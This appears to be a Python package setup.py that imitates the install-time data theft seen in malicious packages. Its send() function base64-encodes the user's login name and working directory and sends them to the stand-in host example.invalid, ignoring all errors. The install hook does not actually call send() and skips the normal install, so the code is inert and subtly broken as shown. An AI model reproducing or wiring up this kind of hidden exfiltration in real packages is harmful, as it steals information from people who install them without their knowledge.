import os, base64
from urllib.request import urlopen
from setuptools import setup
from setuptools.command.install import install

def send():
    try:
        urlopen('https://example.invalid/?u=' + str(base64.urlsafe_b64encode(os.getlogin().encode())) + '&p=' + str(base64.urlsafe_b64encode(os.getcwd().encode()))).read()
    except Exception:
        pass
class Hook(install):
    def run(self):
        pass
setup(name='example', cmdclass={'install': Hook})
